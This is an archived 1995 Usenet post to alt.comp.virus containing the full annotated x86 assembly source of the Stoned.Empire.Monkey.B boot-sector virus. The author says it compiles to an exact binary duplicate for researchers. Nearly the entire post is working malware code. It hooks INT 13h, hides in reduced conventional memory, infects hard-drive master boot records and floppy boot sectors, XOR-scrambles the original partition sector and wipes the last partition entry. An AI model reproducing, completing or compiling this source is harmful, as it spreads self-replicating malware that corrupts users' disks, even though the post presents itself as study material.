From netcom.com!ix.netcom.com!howland.reston.ans.net!europa.eng.gtefsd.com!uhog.mit.edu!bloom-beacon.mit.edu!news.media.mit.edu!tmok.res.wpi.edu!halflife Sun Jan 15 21:28:13 1995
Xref: netcom.com alt.comp.virus:1039
Newsgroups: alt.comp.virus
Path: netcom.com!ix.netcom.com!howland.reston.ans.net!europa.eng.gtefsd.com!uhog.mit.edu!bloom-beacon.mit.edu!news.media.mit.edu!tmok.res.wpi.edu!halflife
From: halflife@tmok.res.wpi.edu (Halflife)
Subject: monkey-b
Message-ID: <halflife.75.0010F53B@tmok.res.wpi.edu>
Lines: 365
Sender: news@news.media.mit.edu (USENET News System)
Organization: MIT Media Laboratory
X-Newsreader: Trumpet for Windows [Version 1.0 Rev A]
Date: Sun, 15 Jan 1995 21:57:21 GMT
Lines: 365

;**************************Stoned.Empire.Monkey.B
;This will create a binary image of Monkey. It compiles real well with the
;A86 compiler. I used that because I was trying to create source that was
;as equivalent to the original binary image as possible. With the exception
;of six bytes that differ due to using functionally equivalent op codes,
;Stoned.Empire.Monkey.B
;This is an MBR infected with the virus, it does not create an executable 
;file. It has to be compiled and manually loaded to the MBR or boot sector
;of a floppy diskette. This is an excellent study as to how these types 
;of viruses, and will give the researcher an very good resource as to how
;the infection mechanism works and how to prevent/clean this and other 
;similar viruses. 
;this is an exact duplicate when compiled with A86. If anyone wants to
;complete the commenting, please feel free as I did not understand some of 
;this code. the author apparently had an excellent understanding of 
;the partition loading stub as these areas are read during the installation
;of the virus. If you do add comments, send me a copy
;Leonard Gragson
;lgragson@fileshop.com
;YBMY91A - Prodigy
;73141,1034 - Compuserve
;
        jmp     short virus_start       ;all jmps are short
        nop     
        mov     ss, ax
        mov     sp, 7c00h
        mov     si, sp
        push    ax
        pop     es
        push    ax
        pop     ds
        sti
        cld
        mov     di, 0600h
        mov     cx, 100h
        repnz   movsw
        db      0eah, 1dh, 6, 0, 0     
                ;jmp far 0000:061dh
        
        mov     si, 7beh



virus_start:
       cli                      ;no system interrupts
       sub      bx, bx          ;zero bx
       mov      ds, bx          ;
       mov      ss, bx
       mov      sp, 7c00h       ;just below boot data area
       
       db       0eah, 2fh, 0, 0c0h, 7
                ;***thats a jmp far  07c0:002f, which is next instruction
                ;***this sets offsets to org 0
       
       
       int      12h             ;get sys mem in ax
       mov      si, 4ch
       push     si
       cmp      byte ptr cs:[00f2h], 2 ;test for BIOS mem location
       jz       next_pt1
       call     shrink_mem

       mov      di, 01fc
       mov      cx, 2
       cld
       repz     movsw           ;load int13h address into virus INT 13h handler
                                ;which will start at es:0
       jmp   short   next_pt2

next_pt1:
        call    set_es
next_pt2:
        pop     si                      ;points to INT 13h vector entry
        mov     word ptr [si], 007dh    ;offset
        mov     word ptr [si + 2], ax   ;ax == es, where virus handler is going

        push    cs
        pop     ds                      ;ds == 0 up to this point
        call    mov_virus               ;ds now == 7c0h

        push    es
        mov     ax, 0062h               ;for retf to virus
        push    ax                      
        sti                             ;enable interrupts
        retf                            ;to es:62h -> see next routine

set_virus:         ;<- this is offset 62h! at virus location es:0062h

        mov     es, cx                  ;like xor es, es
        mov     bx, sp                  ;still at 7c00h!
        push    cx
        push    bx                      ;for return to 0000:7c00

        mov     dx, 0080h               ;c: drive, cyl 0
        call    set_si                  ;haven't figured this out yet

        call    do_virus_thing

        mov     cl, 3
        mov     dx, 80h
        call    read_drive
        call    scramble_boot
        retf

int_13h_handler:
        push    ds
        push    si
        push    di
        push    ax
        push    cx
        push    dx
        call    set_si
        cmp     ah, 2                   ;read operation?
        jnz     not_two
        push    dx
        sub     ax, ax
        int     1ah
        cmp     dl, 40h
        pop     dx
        jnb     not_two
        call    do_virus_thing          ;write a virus to the drive or disk

not_two:
        pop     dx
        pop     cx
        pop     ax
        pop     di
        push    dx
        push    cx
        push    ax
        cmp     cx, 3
        jnb     not_three
        cmp     dh, [si]                ;check for read/write to virus sector
        jnz     not_three
        cmp     ah, 2
        jz      call_int13h
        cmp     ah, 3
        jnz     not_three
        cmp     dl, 80h
        jb      not_three
        sub     ah, ah
        jmp  short   not_three


call_int13h:    
        call    int_13h_call
        jb      end_handler    
        call    check_data1
        jz      point_two      
        call    check_data2
        jz      point_two
        clc
        jmp  short   end_handler

point_two:
        call    set_real_partition
        mov     dh, [si + 1]
        pop     ax
        call    int_13h_call
        call    scramble_boot
        pop     cx
        pop     dx
        jmp  short   end_here
not_three:
        call    int_13h_call
end_handler:
        pop     ds
        pop     ds
        pop     ds
end_here:
        pop     si
        pop     ds
        retf    2

data_area       db      0, 1, 1, 0, 0, 0, 0, 80h, 1, 0, 5, 9, 0bh, 3, 5, 0eh, 0eh

read_drive:
        mov     ax, 0201h               ;read 1 sector
int_13h_call:
        pushf                           ;simulate INT
        db      2eh, 0ffh, 01eh, 0fch, 1 ;cs:call far [01fch]
        ret                                                

shrink_mem:
        dec     ax              ;contains mem from int 12h
        mov     di, 414h
        dec     di              ;this has got to be a "fool the scanner" trick
        mov     [di], ax        ;shrink sys me by 1 K
set_es:
        mov     cl, 6
        shl     ax, cl          ;get top of base mem in segs
        add     al, 20h         ;add a little more to be safe
        mov     es, ax          ;and set es. This will be about 9fe0h or so
                                ;if full 640K mem
        ret

write_drive:                                                    
        mov     dh, [si]        ;on first infection si == 0 - head 0
        mov     ax, 0301h       ;write one sector
        call    int_13h_call    ;and do it

        ret

do_virus_thing:
        sub     cx, cx
        inc     cx
        push    cx                      ;god, mov cx, 1
        mov     dh, [si]                ;location of sector
        call    read_drive              ;read in one sector, this will be partition
                                        ;on first infection
        jb      end_do_virus_thing      ;error? lets abort

        call    check_data1             ;do we have 9219h sectors in last partition? 
        jz      end_do_virus_thing      ;if so, get out of town                
        
        call    check_data2
        jnz     next_virus_pt

        cmp     word ptr es:[bx + 1fah], 0 ; 0 sectors in last partition?
        jz      end_do_virus_thing         ; quit     
        
        mov     word ptr es:[bx + 1fah], 0 ;this will kill last partition
        mov     cl, 1                      ;sector 1?

        call    write_drive
        jb      end_do_virus_thing            ;error abort  
        inc     cx                          ;sector 2?
        mov     dh, [si + 2]
        
        call    read_drive                  ;get the boot sector
        jb      end_do_virus_thing

        pop     ax                          ;should == 1    
        push    cx                          

next_virus_pt:

        call    set_real_partition
        call    scramble_boot

        inc     si
        call    write_drive

        dec     si
        jb      end_do_virus_thing

        call    scramble_boot

        push    cx
        call    mov_virus
        pop     cx
        push    dx
        mov     dl, [si + 3]
        
        ;mov     word ptr es:[bx + 74h], dx
        db      26h, 89h, 97h, 74h, 00
        ;****equivalent, I did this due to A86 translation being a little
        ;****different than the virus I captured
        
        pop     dx
        
        ;mov     byte ptr es:[bx + 72h], cl
        db      26h, 88h, 8fh, 72h, 00
        ;****equivalent, I did this due to A86 translation being a little
        ;****different than the virus I captured

        mov     word ptr es:[bx + 01feh], 0AA55h
        pop     cx
        push    cx
        mov     byte ptr es:[bx + 00f2h], cl
        call    write_drive

end_do_virus_thing:
        pop     ax
        ret

mov_virus:

;****************** whole virus including first jmp is stored
;****************** and accessed later for disk/drive infections
        
        push    si
        mov     di, bx                  ;di == 0
        mov     si, 20h                 ;this is where virus starts
        add     di, si                  ;he's keeping space between 1st jmp
                                        ;and the virus loading stub constant
                                        ;to facilitate future infections
        mov     cx, 1dch                ;we're moving this many
        repz    movsb                   ;and mov 'em

        mov     di, bx                  ;like xor di, di 
        sub     si, si                  ;like xor si, si

        mov     cl, 3                   ;movs the first jmp 
        repz    movsb                   ;instruction!        
        
        pop     si
        ret
;************checks for number of sectors in last partition!
check_data1:
        cmp     word ptr es:[bx + 01fah], 9219h
        ret

;************not sure what is going on here, offset 119h is in the partition code
;************this ain't a virus ID
check_data2:
        cmp     word ptr es:[bx + 119h], 6150h
        ret

scramble_boot:
        push    di
        push    cx
        push    ax
        mov     di, bx
        mov     cx, 200h
        cld
scram_loop:        
        mov     al, byte ptr es:[di]
        xor     al, 2eh
        stosb
        loop    scram_loop

        pop     ax
        pop     cx
        pop     di
        ret

set_si:
        push    cs
        pop     ds
        mov     si, 00eah               ;location of real partition
        cmp     dl, 80h                 ;hard drive access?
        jb      end_set_si              ;no? lets go
        mov     si, 00eeh               ;hard drive infection routine
end_set_si:
        ret

;***********I think this loads the real partition which was read from sector 2
;***********DS equ 7c0h
set_real_partition:

        push    di
        push    si
        mov     al, byte ptr es:[bx + 14h]
        mov     cx, 4
loop_ptr:        
        mov     si, cx
        dec     si
        cmp     [si + 00f3h], al
        jz      set_cl
        loop    loop_ptr
        mov     cl, 3
        jmp  short   bye
set_cl:        
        mov     cl, [si+00f7h]
bye:
        pop     si
        pop     di
        ret


scraps  db      05dh, 7fh, 7eh, 7bh, 75h, 89h, 19h, 92h, 0, 0, 55h, 0aah




